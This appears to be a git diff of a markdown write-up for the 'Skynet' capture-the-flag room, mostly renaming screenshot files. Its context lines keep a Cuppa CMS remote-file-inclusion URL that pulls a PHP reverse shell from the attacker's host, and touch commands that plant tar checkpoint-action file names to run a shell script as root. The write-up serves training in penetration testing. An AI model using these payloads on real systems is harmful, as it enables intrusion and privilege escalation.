@@ -15,7 +15,7 @@ cover:
   relative: true
 ---
 
-![TERMINATOR](TERMINATOR.png)
+![TERMINATOR](terminator-2.png)
 
 _Hasta la vista, baby._  
 
@@ -41,39 +41,39 @@ What is the root flag?
 
 
 #### Nmap Scan (80)
-![skynet scan](skynet scan.png)
+![skynet scan](skynet-scan.png)
 
 
 #### SMB (445)
-![skynet smbmap](skynet smbmap.png)
-![skynet smbclient](skynet smbclient.png)
-![skynet smbclient logs](skynet smbclient logs.png)
-![skynet log1](skynet log1.png)
+![skynet smbmap](skynet-smbmap.png)
+![skynet smbclient](skynet-smbclient.png)
+![skynet smbclient logs](skynet-smbclient-logs.png)
+![skynet log1](skynet-log1.png)
 
 
 #### HTTP
 
-![skynet gobuster](skynet gobuster.png)
+![skynet gobuster](skynet-gobuster.png)
 
-![skynet ffuf](skynet ffuf.png)
-![milesdyson password](milesdyson password.png)
-![milesdyson account](milesdyson account.png)
-![smb password](smb password.png)
-![smb client milesdyson](smb client milesdyson.png)
-![smclient important](smclient important.png)
-![hidden share](hidden share.png)
-![cms web](cms web.png)
-![gobuster cms website](gobuster cms website.png)
-![cuppa cms](cuppa cms.png)
+![skynet ffuf](skynet-ffuf.png)
+![milesdyson password](milesdyson-password.png)
+![milesdyson account](milesdyson-account.png)
+![smb password](smb-password.png)
+![smb client milesdyson](smb-client-milesdyson.png)
+![smclient important](smclient-important.png)
+![hidden share](hidden-share.png)
+![cms web](cms-web.png)
+![gobuster cms website](gobuster-cms-website.png)
+![cuppa cms](cuppa-cms.png)
 
-![not account of milesdavies](not account of milesdavies.png)
+![not account of milesdavies](not-account-of-milesdavies.png)
 
-![searchsploit cuppa](searchsploit cuppa.png)
+![searchsploit cuppa](searchsploit-cuppa.png)
 
-![exploit cuppa cms](exploit cuppa cms.png)
-![reverse shell php](reverse shell php.png)
-![kali shell python](kali shell python.png)
-![upload php shell](upload php shell.png)
+![exploit cuppa cms](exploit-cuppa-cms.png)
+![reverse shell php](reverse-shell-php.png)
+![kali shell python](kali-shell-python.png)
+![upload php shell](upload-php-shell.png)
 ![shell](shell.png)
 http://10.10.130.201/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.21.174.19:8000/reverse_shell.php
 
@@ -85,5 +85,5 @@ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
 touch "/var/www/html/--checkpoint=1"
 ```
 
-![root flag](root flag.png)
+![root flag](root-flag.png)
 
